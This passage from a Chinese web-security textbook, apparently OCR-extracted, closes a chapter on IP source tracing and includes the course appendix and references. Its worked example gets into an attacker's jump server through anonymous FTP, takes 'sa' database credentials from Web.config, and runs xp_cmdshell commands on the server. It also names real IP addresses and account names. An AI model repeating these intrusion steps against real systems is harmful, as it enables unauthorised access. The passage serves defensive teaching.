共2个，免费用户最多可查看100个域名

域名

域三

migelao.com 

www.migelao.com 

图 17-7 攻击源域名关联分析

○ 使用工具：微步在线情报分析平台（https://x.threatbook.cn）。

- 开放端口检测：该 IP 开放 21、80、1433、3389、8000、8021、491547 个端口，如图 17-8 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0205_f857352b9744.jpg)



图 17-8 攻击源开放端口检测


○ 使用工具：Nmap。

- 开放服务检测：该 IP 开放 FTP、SQL Server、远程桌面服务，如图 17-9 所示。

○ 使用工具：Nmap。

![image](MinerU_markdown_Web安全基础教程_assets/image_0206_bf1d5b74aa63.jpg)



图 17-9 攻击源开放服务检查


○ 攻击源脆弱性检测：对攻击源 IP 开放的服务进行分析，首先对于 FTP 服务进行匿名登录分析，发现登录成功，如图 17-10 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0207_88a18a718913.jpg)



图 17-10 攻击源脆弱性检测


由于 FTP 服务器上存放着 Web.config 文件，该文件包含了 SQL Server 的账号信息。查看 Web.config 内容发现当前数据库账号为 sa，因为服务器还开放 1433 端口，可以通过数据库来实现执行系统命令，如图 17-11 所示。

查看服务器管理组 administrators 信息,发现了疑似攻击者的两个账号,分别为 box$和 dengwenjie$,如图 17-12 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0208_97bae0f50f53.jpg)



图 17-11 数据库命令执行


![image](MinerU_markdown_Web安全基础教程_assets/image_0209_5511bb438bad.jpg)



图 17-12 查看服务器管理组信息



对两个攻击者在服务器的行为进行分析, 分别查看两个攻击者账号的上次的登录时间, 如图 17-13 和图 17-14 所示, 再比对攻击事件发生时间, 可以具体确定攻击者进行的攻击以及入侵事件。


<table><tr><td colspan="2">1 exec master.dbo.xp_cmdshell &#x27;net user box$&#x27;</td></tr><tr><td>信息</td><td>结果1</td></tr><tr><td colspan="2">output</td></tr><tr><td colspan="2">用户的注释</td></tr><tr><td>国家/地区代码</td><td>000 (系统默认值)</td></tr><tr><td>帐户启用</td><td>Yes</td></tr><tr><td>帐户到期</td><td>从不</td></tr><tr><td colspan="2">(Null)</td></tr><tr><td>上次设置密码</td><td>2016/12/12 8:37:30</td></tr><tr><td>密码到期</td><td>从不</td></tr><tr><td>密码可更改</td><td>2016/12/12 8:37:30</td></tr><tr><td>需要密码</td><td>Yes</td></tr><tr><td>用户可以更改密码</td><td>Yes</td></tr><tr><td colspan="2">(Null)</td></tr><tr><td>允许的工作站</td><td>All</td></tr><tr><td colspan="2">登录脚本</td></tr><tr><td colspan="2">用户配置文件</td></tr><tr><td colspan="2">主目录</td></tr><tr><td>上次登录</td><td>从不</td></tr></table>


图 17-13 box$上次登录时间


![image](MinerU_markdown_Web安全基础教程_assets/image_0210_bdb9661527b9.jpg)



图 17-14 dengwenjie$上次登录时间


对比分析，dengwenjie$账号创建时间是11月11日的9:19:47，上次登录时间是在12月21日的23:56:00；而box$账号是在12月12日创建的，创建后一次也没有登录过。关于这个IP的攻击事件最早是12月13日检测到，因而可以锁定攻击者是dengwenjie$，如


图 17-15 所示。


<table><tr><td>( )</td><td></td><td></td><td></td></tr></table>


图 17-15 攻击事件时间


也就是新建的 dengwenjie$账号在拿 120.25.65.5 这台服务器后，以 120.25.65.5 作为跳板机进行攻击。

对 120.25.65.5 这台服务器的 FTP 日志进行分析，在 Windows 上，FTP 服务器存放日志的路径为 c:\inetpub\logs\LogFiles\FTPSVCn（其中 n 为数字，在 120.25.65.5 这台服务器上为 1）目录下。通过 findstr 命令过滤，通过 FTP 命令下载 Web.config 日志文件，可以得到下载 Web.config 文件的匿名登录的真实 IP 为 116.253.10.63，如图 17-16 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0211_9cd4ff2858e0.jpg)



图 17-16 跳板机 FTP 日志



最后对 116.253.10.63 进行查询，可以到该 IP 属性为动态 IP，归属地为中国广西贺州，且大量威胁情报显示该 IP 存在垃圾邮件和僵尸网络行为。结束本次溯源，如图 17-17 所示。


<table><tr><td colspan="7">116.253.10.63 IP信息</td></tr><tr><td>IP地址</td><td colspan="6">116.253.10.63</td></tr><tr><td>地理位置</td><td colspan="6">中国,广西,贺州(电信)</td></tr><tr><td>ASN</td><td colspan="6">4134 (CHINANET-BACKBONE No.31,Jin-rong Street, CN)</td></tr><tr><td>Tags</td><td colspan="6">动态IP</td></tr><tr><td>用户标记</td><td>失陷主机(0)</td><td>爆破(0)</td><td>运控服务器(0)</td><td>推荐(0)</td><td>医生(0)</td><td>提供情报</td></tr><tr><td>威胁情报</td><td colspan="2">端口与服务</td><td>反查域名</td><td>数字证书</td><td>可视分析</td><td>情报社区</td></tr><tr><td>威胁情报检测</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>情报源</td><td></td><td></td><td></td><td>发现时间</td><td colspan="2">情报类型</td></tr><tr><td>ThreatBook Labs</td><td></td><td></td><td></td><td>2016-06-30</td><td colspan="2">僵尸网络</td></tr><tr><td>ThreatBook Labs</td><td></td><td></td><td></td><td>2016-06-28</td><td colspan="2">垃圾邮件,僵尸网络</td></tr><tr><td>ThreatBook Labs</td><td></td><td></td><td></td><td>2016-05-17</td><td colspan="2">动态IP</td></tr></table>


图 17-17 攻击者 IP 信息


网络追踪溯源技术是网络对抗中的关键技术之一，是网络管理、防范网络犯罪的有效方法。使用追踪溯源可以及时确定网络攻击源，制定有针对性的防御策略，提高网络主动防御的能力，威慑潜在的网络攻击者。设计通用化的网络追踪溯源技术框架可以在更加广泛的网络空间中应用追踪溯源技术，更好地维护互联网健康发展。

## 附录

![image](MinerU_markdown_Web安全基础教程_assets/image_0212_fd22d6dc2127.jpg)



课时分配


<table><tr><td>篇名</td><td>章名</td><td>课时数</td></tr><tr><td rowspan="2">第1篇 Web安全基础介绍</td><td>第1章 Web安全简介</td><td>2</td></tr><tr><td>第2章 Web安全基础知识介绍</td><td>4</td></tr><tr><td rowspan="2">第2篇 Web安全测试方法</td><td>第3章 信息探测</td><td>4</td></tr><tr><td>第4章 Web漏洞检测工具简介</td><td>2</td></tr><tr><td rowspan="9">第3篇 Web常见漏洞介绍</td><td>第5章 SQL注入漏洞</td><td>6</td></tr><tr><td>第6章 上传漏洞</td><td>6</td></tr><tr><td>第7章 XSS跨站脚本漏洞</td><td>6</td></tr><tr><td>第8章 命令执行漏洞</td><td>4</td></tr><tr><td>第9章 文件包含漏洞</td><td>4</td></tr><tr><td>第10章 其他漏洞(简单介绍)</td><td>4</td></tr><tr><td>第11章 暴力破解</td><td>6</td></tr><tr><td>第12章 旁注攻击</td><td>4</td></tr><tr><td>第13章 提权</td><td>4</td></tr><tr><td>第4篇 Web安全实战演练</td><td>第14章 攻击全过程</td><td>6</td></tr><tr><td rowspan="3">第5篇 日常安全意识</td><td>第15章 社会工程学</td><td>2</td></tr><tr><td>第16章 电信诈骗手段还原</td><td>2</td></tr><tr><td>第17章 IP溯源技术及标准化</td><td>2</td></tr><tr><td>总课时</td><td colspan="2">68</td></tr></table>

## 参考文献



[1] 沧海浮萍. 黑客破解精通[M]. 哈尔滨：黑龙江文化电子音像出版社，2009.





[2] 张开华（冰的原点）. 黑客渗透笔记[M]. 济南：齐鲁电子音像出版社，2009.





[3] 张炳帅. Web 安全深度剖析[M]. 北京：电子工业出版社，2015.





[4] 吴翰清. 白帽子讲 Web 安全[M]. 北京：电子工业出版社，2012.





[5] 陈周国，蒲石，祝世雄. 一种通用的互联网追踪溯源技术框架[J]. 计算机系统应用，2012（9）：116-170.





[6] 张璐, 等. 基于时隙质心流水印的匿名通信追踪技术[J]. 软件学报, 2011, 22(10): 2358-2371.





[7] 陈周国，祝世雄. 计算机网络追踪溯源技术现状及其评估初探[J]. 信息安全与通信保密，2009（8）：179-182.





[8] 林白露，杨百龙，毛晶，等. IP 溯源技术及其分类方案研究[J]. 电脑知识与技术，2012: 8（13）.

